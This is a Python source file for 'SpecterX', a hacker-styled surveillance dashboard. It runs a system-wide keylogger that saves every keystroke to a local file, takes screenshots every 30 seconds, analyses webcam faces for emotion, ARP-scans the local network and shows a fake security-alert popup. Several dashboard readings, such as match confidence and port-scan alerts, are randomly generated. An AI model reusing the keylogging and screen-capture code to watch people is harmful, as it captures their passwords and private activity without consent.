import cv2
import threading
import tkinter as tk
from PIL import Image, ImageTk
import ttkbootstrap as ttk
from ttkbootstrap.constants import *
from ttkbootstrap import Style
import pyautogui
import numpy as np
import time
import random
import os
import socket
import platform
import psutil
import datetime
from pynput import keyboard
from scapy.all import ARP, Ether, srp, conf
import pandas as pd
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import matplotlib.animation as animation
from matplotlib.figure import Figure
import ctypes
from ctypes import windll
from deepface import DeepFace
from queue import Queue

# ========== Global Setup ==========
keys = []
os.makedirs("logs", exist_ok=True)
os.makedirs("screenshots", exist_ok=True)
keylog_path = "logs/keylog.csv"
event_log_path = "logs/events.csv"
screenshot_interval = 30  # seconds

# Set DPI awareness to improve rendering
try:
    ctypes.windll.shcore.SetProcessDpiAwareness(1)
except:
    pass

# ========== Animation Constants ==========
ANIMATION_SPEED = 10
SCAN_ANIMATION_FRAMES = 20
PULSE_ANIMATION_FRAMES = 30

# ========== Keylogger ==========
def on_press(key):
    keys.append(str(key))
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(keylog_path, "a") as f:
        f.write(f"{timestamp},{str(key)}\n")
    
    # Log special keys as events
    if hasattr(key, 'char') and key.char:
        if key.char in ['@', '#', '$', '%', '^', '&', '*']:
            log_event(f"Special character pressed: {key.char}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    log_event("Keylogger activated")
    return listener

# ========== Event Logger ==========
def log_event(event_description):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(event_log_path, "a") as f:
        f.write(f"{timestamp},{event_description}\n")

# ========== Screenshot Capture ==========
def capture_screenshot():
    while True:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshots/screen_{timestamp}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        log_event(f"Screenshot captured: {filename}")
        time.sleep(screenshot_interval)

# ========== Emotion Detector ==========
def detect_faces_and_emotion(frame):
    try:
        result = DeepFace.analyze(frame, actions=["emotion"], enforce_detection=False)
        if isinstance(result, list) and len(result) > 0:
            return result[0]['dominant_emotion']
        return "Unknown"
    except Exception as e:
        return "Unknown"

# ========== Network Scanner ==========
def scan_devices():
    target_ip = "192.168.1.0/24"
    try:
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]

        found = []
        for sent, received in result:
            found.append({'ip': received.psrc, 'mac': received.hwsrc})
        log_event(f"Network scan complete: {len(found)} devices found")
        return found
    except Exception as e:
        log_event(f"Network scan error: {str(e)}")
        return []

# ========== System Info ==========
def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "platform": platform.system(),
        "platform-release": platform.release(),
        "platform-version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "ram": f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB",
        "cpu_usage": f"{psutil.cpu_percent()}%",
        "ram_usage": f"{psutil.virtual_memory().percent}%",
        "disk_usage": f"{psutil.disk_usage('/').percent}%"
    }
    return info

# ========== Fake Popup ==========
def send_fake_popup():
    log_event("Fake security alert triggered")
    pyautogui.alert(
        text="⚠️ CRITICAL SECURITY ALERT!\n\nPotential intrusion detected on this system.\nMultiple unauthorized connection attempts identified.\n\nClick OK to initiate security protocols.",
        title="🔐 Security Breach Detection", button='OK'
    )

# ========== CPU/RAM Monitor ==========
def create_resource_monitor(parent):
    fig = Figure(figsize=(5, 2), dpi=100)
    ax = fig.add_subplot(111)
    
    canvas = FigureCanvasTkAgg(fig, master=parent)
    canvas.draw()
    canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
    
    # Initialize with zeroes
    cpu_data = [0] * 30
    ram_data = [0] * 30
    x_data = list(range(30))
    
    # Create empty line plots
    cpu_line, = ax.plot(x_data, cpu_data, 'r-', label='CPU')
    ram_line, = ax.plot(x_data, ram_data, 'b-', label='RAM')
    
    ax.set_ylim(0, 100)
    ax.set_xlim(0, 29)
    ax.set_title('System Resource Usage')
    ax.set_ylabel('Usage %')
    ax.legend(loc='upper left')
    ax.grid(True, linestyle='--', alpha=0.7)
    
    # Apply dark theme to plot
    ax.set_facecolor('#2b2b2b')
    fig.patch.set_facecolor('#2b2b2b')
    ax.tick_params(colors='white')
    ax.title.set_color('white')
    ax.yaxis.label.set_color('white')
    for spine in ax.spines.values():
        spine.set_color('#555555')
    
    def animate(i):
        nonlocal cpu_data, ram_data
        
        cpu_percent = psutil.cpu_percent()
        ram_percent = psutil.virtual_memory().percent
        
        cpu_data.append(cpu_percent)
        ram_data.append(ram_percent)
        
        # Keep only last 30 data points
        cpu_data = cpu_data[-30:]
        ram_data = ram_data[-30:]
        
        cpu_line.set_ydata(cpu_data)
        ram_line.set_ydata(ram_data)
        
        return cpu_line, ram_line
    
    ani = animation.FuncAnimation(fig, animate, interval=1000, blit=True)
    return ani

# ========== Animated Network Graph ==========
def create_network_graph(parent):
    fig = Figure(figsize=(5, 4), dpi=100)
    ax = fig.add_subplot(111)
    
    canvas = FigureCanvasTkAgg(fig, master=parent)
    canvas.draw()
    canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
    
    # Generate initial random network data
    num_nodes = 10
    x = np.random.rand(num_nodes)
    y = np.random.rand(num_nodes)
    
    # Create scatter plot for nodes
    scatter = ax.scatter(x, y, s=100, c='cyan', alpha=0.7, edgecolors='white')
    
    # Create empty line collection for edges
    lines = []
    for i in range(num_nodes):
        for j in range(i+1, num_nodes):
            if random.random() > 0.7:  # 30% chance of connection
                line, = ax.plot([x[i], x[j]], [y[i], y[j]], 'w-', alpha=0.3)
                lines.append(line)
    
    ax.set_title('Network Activity Visualization')
    ax.set_xlim(0, 1)
    ax.set_ylim(0, 1)
    ax.axis('off')
    
    # Apply dark theme
    ax.set_facecolor('#1a1a1a')
    fig.patch.set_facecolor('#1a1a1a')
    
    def animate(i):
        nonlocal x, y, lines, scatter
        
        # Update node positions slightly
        x += np.random.normal(0, 0.01, num_nodes)
        y += np.random.normal(0, 0.01, num_nodes)
        
        # Keep within bounds
        x = np.clip(x, 0.05, 0.95)
        y = np.clip(y, 0.05, 0.95)
        
        # Update scatter plot
        scatter.set_offsets(np.column_stack([x, y]))
        
        # Update lines
        for idx, line in enumerate(lines):
            i, j = divmod(idx, num_nodes-1)
            if j >= i: j += 1
            line.set_data([x[i], x[j]], [y[i], y[j]])
        
        # Randomly highlight some connections
        for line in lines:
            if random.random() > 0.9:
                line.set_alpha(0.8)
                line.set_color('aqua')
            else:
                line.set_alpha(0.3)
                line.set_color('white')
        
        return [scatter] + lines
    
    ani = animation.FuncAnimation(fig, animate, interval=200, blit=True)  # Reduced animation frequency
    return ani

# ========== UI Dashboard ==========
def start_dashboard():
    # Start background processes
    keylogger = start_keylogger()
    screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
    screenshot_thread.start()
    
    # Create root window
    root = tk.Tk()
    root.title("SpecterX Advanced Cyber Surveillance Dashboard")
    root.geometry("1280x800")
    root.configure(bg='black')
    
    # Set theme
    style = Style(theme='darkly')
    
    # Create notebook for tabbed interface
    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    # ===== Main Dashboard Tab =====
    main_tab = ttk.Frame(notebook)
    notebook.add(main_tab, text="🎯 MAIN DASHBOARD")
    
    # Top header
    header_frame = ttk.Frame(main_tab)
    header_frame.pack(fill=tk.X, pady=10)
    
    title_label = ttk.Label(header_frame, text="SPECTER-X SURVEILLANCE SYSTEM", 
                           font=("Courier New", 20, "bold"))
    title_label.pack(side=tk.LEFT, padx=10)
    
    status_label = ttk.Label(header_frame, text="● SYSTEM ACTIVE", foreground="lime", 
                            font=("Courier New", 12))
    status_label.pack(side=tk.RIGHT, padx=10)
    
    # Animated status update
    def update_status():
        status_texts = ["● SYSTEM ACTIVE", "● SCANNING", "● MONITORING", "● COLLECTING DATA"]
        current = status_label.cget("text")
        idx = status_texts.index(current) if current in status_texts else 0
        next_idx = (idx + 1) % len(status_texts)
        status_label.config(text=status_texts[next_idx])
        root.after(3000, update_status)
    
    update_status()
    
    # Create main content frame with 2x2 grid
    content_frame = ttk.Frame(main_tab)
    content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    # Make grid layout
    content_frame.columnconfigure(0, weight=1)
    content_frame.columnconfigure(1, weight=1)
    content_frame.rowconfigure(0, weight=1)
    content_frame.rowconfigure(1, weight=1)
    
    # ----- Webcam Panel -----
    cam_frame = ttk.LabelFrame(content_frame, text="🎥 LIVE SURVEILLANCE FEED")
    cam_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
    
    # Webcam display with border effect
    cam_border = ttk.Frame(cam_frame, borderwidth=2, relief="groove")
    cam_border.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
    
    video_label = ttk.Label(cam_border)
    video_label.pack(fill=tk.BOTH, expand=True)
    
    # Status indicators below camera
    cam_status_frame = ttk.Frame(cam_frame)
    cam_status_frame.pack(fill=tk.X, pady=5)
    
    emotion_label = ttk.Label(cam_status_frame, text="EMOTION: UNKNOWN", font=("Courier New", 10))
    emotion_label.pack(side=tk.LEFT, padx=10)
    
    fps_label = ttk.Label(cam_status_frame, text="FPS: 0", font=("Courier New", 10))
    fps_label.pack(side=tk.RIGHT, padx=10)
    
    # ----- System Info Panel -----
    info_frame = ttk.LabelFrame(content_frame, text="🧠 SYSTEM ANALYTICS")
    info_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
    
    # System info display
    system_info = get_system_info()
    
    info_content = ttk.Frame(info_frame)
    info_content.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    # Add system info in a more aesthetic way with progress bars
    ttk.Label(info_content, text="SYSTEM IDENTIFICATION", font=("Courier New", 12, "bold")).pack(anchor="w", pady=(0, 10))
    
    host_frame = ttk.Frame(info_content)
    host_frame.pack(fill=tk.X, pady=2)
    ttk.Label(host_frame, text="HOSTNAME:", width=15).pack(side=tk.LEFT)
    hostname_var = tk.StringVar(value=system_info["hostname"])
    ttk.Label(host_frame, textvariable=hostname_var).pack(side=tk.LEFT)
    
    ip_frame = ttk.Frame(info_content)
    ip_frame.pack(fill=tk.X, pady=2)
    ttk.Label(ip_frame, text="LOCAL IP:", width=15).pack(side=tk.LEFT)
    ip_var = tk.StringVar(value=system_info["ip"])
    ttk.Label(ip_frame, textvariable=ip_var).pack(side=tk.LEFT)
    
    os_frame = ttk.Frame(info_content)
    os_frame.pack(fill=tk.X, pady=2)
    ttk.Label(os_frame, text="OS:", width=15).pack(side=tk.LEFT)
    os_var = tk.StringVar(value=f"{system_info['platform']} {system_info['platform-release']}")
    ttk.Label(os_frame, textvariable=os_var).pack(side=tk.LEFT)
    
    # Resource usage
    ttk.Label(info_content, text="RESOURCE UTILIZATION", font=("Courier New", 12, "bold")).pack(anchor="w", pady=(20, 10))
    
    cpu_frame = ttk.Frame(info_content)
    cpu_frame.pack(fill=tk.X, pady=2)
    ttk.Label(cpu_frame, text="CPU USAGE:", width=15).pack(side=tk.LEFT)
    cpu_var = tk.StringVar(value="0%")
    ttk.Label(cpu_frame, textvariable=cpu_var).pack(side=tk.LEFT)
    cpu_bar = ttk.Progressbar(cpu_frame, length=200)
    cpu_bar.pack(side=tk.RIGHT, padx=10)
    
    ram_frame = ttk.Frame(info_content)
    ram_frame.pack(fill=tk.X, pady=2)
    ttk.Label(ram_frame, text="RAM USAGE:", width=15).pack(side=tk.LEFT)
    ram_var = tk.StringVar(value="0%")
    ttk.Label(ram_frame, textvariable=ram_var).pack(side=tk.LEFT)
    ram_bar = ttk.Progressbar(ram_frame, length=200)
    ram_bar.pack(side=tk.RIGHT, padx=10)
    
    disk_frame = ttk.Frame(info_content)
    disk_frame.pack(fill=tk.X, pady=2)
    ttk.Label(disk_frame, text="DISK USAGE:", width=15).pack(side=tk.LEFT)
    disk_var = tk.StringVar(value="0%")
    ttk.Label(disk_frame, textvariable=disk_var).pack(side=tk.LEFT)
    disk_bar = ttk.Progressbar(disk_frame, length=200)
    disk_bar.pack(side=tk.RIGHT, padx=10)
    
    # Action buttons with cooler styling
    action_frame = ttk.Frame(info_content)
    action_frame.pack(fill=tk.X, pady=(20, 10))
    
    scan_btn = ttk.Button(action_frame, text="🔍 SCAN NETWORK", style="Accent.TButton", 
                         command=lambda: notebook.select(1))  # Switch to network tab
    scan_btn.pack(side=tk.LEFT, padx=5)
    
    alert_btn = ttk.Button(action_frame, text="⚠️ TRIGGER ALERT", style="Danger.TButton", 
                          command=send_fake_popup)
    alert_btn.pack(side=tk.LEFT, padx=5)
    
    # ----- Network Devices Panel -----
    net_frame = ttk.LabelFrame(content_frame, text="🌐 ACTIVE NETWORK CONNECTIONS")
    net_frame.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
    
    # Search and filter bar
    search_frame = ttk.Frame(net_frame)
    search_frame.pack(fill=tk.X, padx=5, pady=5)
    
    ttk.Label(search_frame, text="FILTER:").pack(side=tk.LEFT, padx=(0, 5))
    search_var = tk.StringVar()
    search_entry = ttk.Entry(search_frame, textvariable=search_var)
    search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
    
    # Network devices table with scrollbar
    tree_frame = ttk.Frame(net_frame)
    tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    columns = ("ip", "mac", "status", "last_seen")
    tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=10)
    
    tree.heading("ip", text="IP Address")
    tree.heading("mac", text="MAC Address")
    tree.heading("status", text="Status")
    tree.heading("last_seen", text="Last Activity")
    
    tree.column("ip", width=120)
    tree.column("mac", width=150)
    tree.column("status", width=80)
    tree.column("last_seen", width=100)
    
    # Add scrollbar
    scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=tree.yview)
    tree.configure(yscroll=scrollbar.set)
    
    tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    
    # Animation indicator
    scanning_label = ttk.Label(net_frame, text="", font=("Courier New", 9))
    scanning_label.pack(side=tk.BOTTOM, pady=5)
    
    # ----- Keystroke Log Panel -----
    log_frame = ttk.LabelFrame(content_frame, text="⌨️ KEYSTROKE MONITORING")
    log_frame.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")
    
    # Tab system for different logs
    log_notebook = ttk.Notebook(log_frame)
    log_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    # Keylog tab
    keylog_tab = ttk.Frame(log_notebook)
    log_notebook.add(keylog_tab, text="Keystrokes")
    
    keylog_box = tk.Text(keylog_tab, bg="#1c1c1c", fg="#33ff33", font=("Consolas", 10))
    keylog_box.pack(fill=tk.BOTH, expand=True)
    
    # Events tab
    events_tab = ttk.Frame(log_notebook)
    log_notebook.add(events_tab, text="Events")
    
    events_box = tk.Text(events_tab, bg="#1c1c1c", fg="#33ff33", font=("Consolas", 10))
    events_box.pack(fill=tk.BOTH, expand=True)
    
    # ===== Network Monitor Tab =====
    network_tab = ttk.Frame(notebook)
    notebook.add(network_tab, text="🌐 NETWORK MONITOR")
    
    # Network tab layout
    network_tab.columnconfigure(0, weight=3)
    network_tab.columnconfigure(1, weight=2)
    network_tab.rowconfigure(0, weight=1)
    
    # Network visualization panel
    net_viz_frame = ttk.LabelFrame(network_tab, text="NETWORK TOPOLOGY MAP")
    net_viz_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
    
    # Start network visualization animation
    net_graph_ani = create_network_graph(net_viz_frame)
    
    # Network details panel
    net_details_frame = ttk.LabelFrame(network_tab, text="CONNECTION DETAILS")
    net_details_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
    
    # Network stats
    stats_frame = ttk.Frame(net_details_frame)
    stats_frame.pack(fill=tk.X, pady=10)
    
    ttk.Label(stats_frame, text="TOTAL CONNECTIONS:", width=20).grid(row=0, column=0, sticky="w", pady=2)
    conn_count_var = tk.StringVar(value="0")
    ttk.Label(stats_frame, textvariable=conn_count_var).grid(row=0, column=1, sticky="w", pady=2)
    
    ttk.Label(stats_frame, text="ACTIVE HOSTS:", width=20).grid(row=1, column=0, sticky="w", pady=2)
    host_count_var = tk.StringVar(value="0")
    ttk.Label(stats_frame, textvariable=host_count_var).grid(row=1, column=1, sticky="w", pady=2)
    
    ttk.Label(stats_frame, text="SUSPICIOUS ACTIVITY:", width=20).grid(row=2, column=0, sticky="w", pady=2)
    suspicious_var = tk.StringVar(value="None Detected")
    ttk.Label(stats_frame, textvariable=suspicious_var).grid(row=2, column=1, sticky="w", pady=2)
    
    # Connection logs
    conn_log_frame = ttk.LabelFrame(net_details_frame, text="CONNECTION LOG")
    conn_log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
    
    conn_log = tk.Text(conn_log_frame, bg="#1c1c1c", fg="#33ff33", font=("Consolas", 9), height=15)
    conn_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    # ===== System Monitor Tab =====
    system_tab = ttk.Frame(notebook)
    notebook.add(system_tab, text="💻 SYSTEM MONITOR")
    
    # System monitor layout
    system_tab.columnconfigure(0, weight=1)
    system_tab.rowconfigure(0, weight=1)
    system_tab.rowconfigure(1, weight=1)
    
    # Resource monitor panel
    resource_frame = ttk.LabelFrame(system_tab, text="SYSTEM RESOURCE UTILIZATION")
    resource_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
    
    # Start resource monitor animation
    resource_ani = create_resource_monitor(resource_frame)
    
    # Process list panel
    process_frame = ttk.LabelFrame(system_tab, text="ACTIVE PROCESSES")
    process_frame.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
    
    # Process list with search
    process_search_frame = ttk.Frame(process_frame)
    process_search_frame.pack(fill=tk.X, padx=5, pady=5)
    
    ttk.Label(process_search_frame, text="SEARCH:").pack(side=tk.LEFT, padx=(0, 5))
    process_search_var = tk.StringVar()
    process_search_entry = ttk.Entry(process_search_frame, textvariable=process_search_var)
    process_search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
    
    refresh_btn = ttk.Button(process_search_frame, text="🔄 REFRESH", style="Info.TButton")
    refresh_btn.pack(side=tk.RIGHT, padx=5)
    
    # Process table
    process_tree_frame = ttk.Frame(process_frame)
    process_tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    process_columns = ("pid", "name", "cpu", "memory", "status")
    process_tree = ttk.Treeview(process_tree_frame, columns=process_columns, show='headings', height=10)
    
    process_tree.heading("pid", text="PID")
    process_tree.heading("name", text="Process Name")
    process_tree.heading("cpu", text="CPU %")
    process_tree.heading("memory", text="Memory")
    process_tree.heading("status", text="Status")
    
    process_tree.column("pid", width=80)
    process_tree.column("name", width=200)
    process_tree.column("cpu", width=80)
    process_tree.column("memory", width=100)
    process_tree.column("status", width=100)
    
    # Add scrollbar for process tree
    process_scrollbar = ttk.Scrollbar(process_tree_frame, orient=tk.VERTICAL, command=process_tree.yview)
    process_tree.configure(yscroll=process_scrollbar.set)
    
    process_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    process_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    
    # ===== Initialize Webcam =====
    cap = None
    
    def start_capture():
        nonlocal cap
        cap = cv2.VideoCapture(0)
        cap.set(cv2.CAP_PROP_FPS, 30)  # Reduced FPS request
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        return cap
    
    capture_thread = threading.Thread(target=start_capture)
    capture_thread.daemon = True
    capture_thread.start()
    capture_thread.join()  # Wait for camera to initialize
    
    # Precompute grid overlay
    grid_overlay = np.zeros((480, 640, 3), dtype=np.uint8)
    grid_size = 50
    alpha = 0.3
    for x in range(0, 640, grid_size):
        cv2.line(grid_overlay, (x, 0), (x, 480), (0, 255, 0), 1)
    for y in range(0, 480, grid_size):
        cv2.line(grid_overlay, (0, y), (640, y), (0, 255, 0), 1)
    grid_overlay = cv2.addWeighted(grid_overlay, alpha, np.zeros_like(grid_overlay), 0, 0)
    
    # Emotion detection queue and thread
    emotion_queue = Queue(maxsize=1)
    emotion_thread_running = True
    
    def emotion_detection_worker():
        while emotion_thread_running:
            try:
                frame = emotion_queue.get(timeout=1)
                emotion = detect_faces_and_emotion(frame)
                emotion_label.config(text=f"EMOTION: {emotion.upper()}")
            except:
                pass
    
    emotion_thread = threading.Thread(target=emotion_detection_worker, daemon=True)
    emotion_thread.start()
    
    # Frame processing variables
    last_frame_time = time.time()
    fps_counter = 0
    fps_display = 0
    fps_update_time = time.time()
    
    # Face detection cascade
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
    
    def update_frame():
        nonlocal last_frame_time, fps_counter, fps_display, fps_update_time
        
        if cap is None or not cap.isOpened():
            video_label.configure(image='')
            video_label.image = None
            root.after(1000, update_frame)
            return
        
        ret, frame = cap.read()
        if not ret:
            root.after(33, update_frame)
            return
        
        # Calculate FPS
        current_time = time.time()
        fps_counter += 1
        
        if current_time - fps_update_time >= 1.0:
            fps_display = fps_counter
            fps_counter = 0
            fps_update_time = current_time
            fps_label.config(text=f"FPS: {fps_display}")
        
        # Process frame
        process_frame = frame.copy()
        
        # Add HUD overlay
        cv2.putText(process_frame, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
                   (10, 25), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 1)
        
        # Add precomputed grid overlay
        process_frame = cv2.add(process_frame, grid_overlay)
        
        # Add scan lines effect
        scan_line_pos = int((time.time() * 50) % process_frame.shape[0])
        process_frame[scan_line_pos:scan_line_pos+1, :] = [0, 255, 0]
        
        # Queue emotion detection every 15 frames
        if fps_counter % 15 == 0 and not emotion_queue.full():
            emotion_queue.put(process_frame.copy())
        
        # Face detection (optimized parameters)
        try:
            gray = cv2.cvtColor(process_frame, cv2.COLOR_BGR2GRAY)
            faces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=5)
            
            for (x, y, w, h) in faces:
                cv2.rectangle(process_frame, (x, y), (x+w, y+h), (0, 255, 0), 2)
                cv2.putText(process_frame, "SUBJECT DETECTED", (x, y-10), 
                           cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 1)
                confidence = random.randint(85, 99)
                cv2.putText(process_frame, f"MATCH CONF: {confidence}%", (x, y+h+20), 
                           cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 1)
        except Exception:
            pass
        
        # Convert to RGB for display
        rgb_frame = cv2.cvtColor(process_frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(rgb_frame)
        imgtk = ImageTk.PhotoImage(image=img)
        video_label.imgtk = imgtk
        video_label.configure(image=imgtk)
        
        # Update frame at optimized interval
        root.after(33, update_frame)  # ~30 FPS
    
    # Start webcam update
    update_frame()
    
    # ===== Update functions =====
    
    # Update system info
    def update_system_info():
        system_info = get_system_info()
        
        hostname_var.set(system_info["hostname"])
        ip_var.set(system_info["ip"])
        os_var.set(f"{system_info['platform']} {system_info['platform-release']}")
        
        cpu_usage = int(float(system_info["cpu_usage"].strip('%')))
        ram_usage = int(float(system_info["ram_usage"].strip('%')))
        disk_usage = int(float(system_info["disk_usage"].strip('%')))
        
        cpu_var.set(f"{cpu_usage}%")
        ram_var.set(f"{ram_usage}%")
        disk_var.set(f"{disk_usage}%")
        
        cpu_bar["value"] = cpu_usage
        ram_bar["value"] = ram_usage
        disk_bar["value"] = disk_usage
        
        root.after(2000, update_system_info)
    
    # Animated scan indicator
    def animate_scan_indicator():
        scan_phases = [
            "",
            "[          ] SCANNING",
            "[=         ] SCANNING",
            "[==        ] SCANNING",
            "[===       ] SCANNING",
            "[====      ] SCANNING",
            "[=====     ] SCANNING",
            "[======    ] SCANNING",
            "[=======   ] SCANNING",
            "[========  ] SCANNING",
            "[========= ] SCANNING",
            "[==========] COMPLETE",
        ]
        
        current_phase = 0
        
        def update_scan_animation():
            nonlocal current_phase
            scanning_label.config(text=scan_phases[current_phase])
            current_phase = (current_phase + 1) % len(scan_phases)
            root.after(200, update_scan_animation)
        
        update_scan_animation()
    
    animate_scan_indicator()
    
    # Update network devices
    def update_devices():
        devices = scan_devices()
        tree.delete(*tree.get_children())
        
        search_term = search_var.get().lower()
        conn_count_var.set(str(len(devices)))
        host_count_var.set(str(len(devices)))
        
        for idx, dev in enumerate(devices):
            if search_term and search_term not in dev["ip"].lower() and search_term not in dev["mac"].lower():
                continue
                
            last_seen = datetime.datetime.now() - datetime.timedelta(seconds=random.randint(0, 300))
            last_seen_str = last_seen.strftime("%H:%M:%S")
            status = random.choice(["Active", "Idle", "Active"])
            
            tree.insert("", "end", values=(dev["ip"], dev["mac"], status, last_seen_str),
                       tags=(f"device{idx}",))
            
            if random.random() > 0.7:
                log_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Connection from {dev['ip']} ({dev['mac']})\n"
                conn_log.insert(tk.END, log_entry)
                conn_log.see(tk.END)
        
        if random.random() > 0.9:
            suspicious_var.set("Possible Port Scan")
            suspicious_ip = f"192.168.1.{random.randint(2, 254)}"
            log_event(f"Suspicious activity from {suspicious_ip}")
            alert_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] ⚠️ ALERT: Possible port scan from {suspicious_ip}\n"
            conn_log.insert(tk.END, alert_entry, "alert")
            conn_log.tag_configure("alert", foreground="red")
            conn_log.see(tk.END)
        else:
            suspicious_var.set("None Detected")
        
        root.after(10000, update_devices)  # Reduced update frequency
    
    # Update process list
    def update_processes():
        process_tree.delete(*process_tree.get_children())
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'status']):
            try:
                process_info = proc.info
                processes.append({
                    'pid': process_info['pid'],
                    'name': process_info['name'],
                    'cpu': process_info['cpu_percent'],
                    'memory': process_info['memory_info'].rss // (1024 * 1024),
                    'status': process_info['status']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        processes.sort(key=lambda x: x['cpu'], reverse=True)
        processes = processes[:50]
        
        search_term = process_search_var.get().lower()
        if search_term:
            processes = [p for p in processes if search_term in p['name'].lower()]
        
        for proc in processes:
            process_tree.insert("", "end", values=(
                proc['pid'],
                proc['name'],
                f"{proc['cpu']:.1f}%",
                f"{proc['memory']} MB",
                proc['status']
            ))
        
        root.after(3000, update_processes)
    
    # Update keylogs
    def update_keylogs():
        if os.path.exists(keylog_path):
            try:
                with open(keylog_path, "r") as f:
                    lines = f.readlines()[-20:]
                keylog_box.delete("1.0", tk.END)
                for line in lines:
                    parts = line.strip().split(',', 1)
                    if len(parts) == 2:
                        timestamp, key = parts
                        keylog_box.insert(tk.END, f"[{timestamp}] {key}\n")
            except Exception as e:
                keylog_box.delete("1.0", tk.END)
                keylog_box.insert(tk.END, f"Error reading keylog: {str(e)}")
        root.after(1000, update_keylogs)
    
    # Update event logs
    def update_eventlogs():
        if os.path.exists(event_log_path):
            try:
                with open(event_log_path, "r") as f:
                    lines = f.readlines()[-20:]
                events_box.delete("1.0", tk.END)
                for line in lines:
                    parts = line.strip().split(',', 1)
                    if len(parts) == 2:
                        timestamp, event = parts
                        events_box.insert(tk.END, f"[{timestamp}] {event}\n")
            except Exception as e:
                events_box.delete("1.0", tk.END)
                events_box.insert(tk.END, f"Error reading event log: {str(e)}")
        root.after(2000, update_eventlogs)
    
    # Start updates
    update_system_info()
    update_devices()
    update_processes()
    update_keylogs()
    update_eventlogs()
    
    # Process management
    def kill_selected_process():
        selected = process_tree.selection()
        if selected:
            item = process_tree.item(selected[0])
            pid = int(item['values'][0])
            try:
                psutil.Process(pid).terminate()
                log_event(f"Terminated process {pid}")
                update_processes()
            except Exception as e:
                pass
    
    terminate_btn = ttk.Button(process_search_frame, text="❌ TERMINATE", 
                             style="Danger.TButton", command=kill_selected_process)
    terminate_btn.pack(side=tk.RIGHT, padx=5)
    refresh_btn.configure(command=update_processes)
    
    # ===== Startup Animation =====
    def startup_animation():
        splash = tk.Toplevel(root)
        splash.overrideredirect(True)
        width = 500
        height = 300
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width - width) // 2
        y = (screen_height - height) // 2
        splash.geometry(f"{width}x{height}+{x}+{y}")
        splash.configure(bg="black")
        
        logo_label = tk.Label(splash, text="SPECTER-X", font=("Courier New", 32, "bold"), 
                             fg="#00ff00", bg="black")
        logo_label.pack(pady=(50, 20))
        
        status_var = tk.StringVar(value="Initializing system...")
        status_label = tk.Label(splash, textvariable=status_var, font=("Courier New", 12),
                               fg="#00ff00", bg="black")
        status_label.pack(pady=10)
        
        progress = ttk.Progressbar(splash, mode="determinate")
        progress.pack(fill=tk.X, padx=50, pady=20)
        
        def update_splash(value, text):
            progress["value"] = value
            status_var.set(text)
            splash.update()
        
        for i, text in enumerate([
            "Initializing system modules...",
            "Loading surveillance components...",
            "Establishing network connections...",
            "Calibrating sensors...",
            "Activating keystroke monitoring...",
            "Enabling facial recognition...",
            "Scanning local network...",
            "Activating security protocols...",
            "System check complete...",
            "Starting SpecterX..."
        ]):
            update_splash((i+1)*10, text)
            time.sleep(0.2)
        
        splash.destroy()
    
    threading.Thread(target=startup_animation, daemon=True).start()
    
    # Handle closing
    def on_closing():
        nonlocal emotion_thread_running
        emotion_thread_running = False
        if cap is not None and cap.isOpened():
            cap.release()
        root.destroy()
    
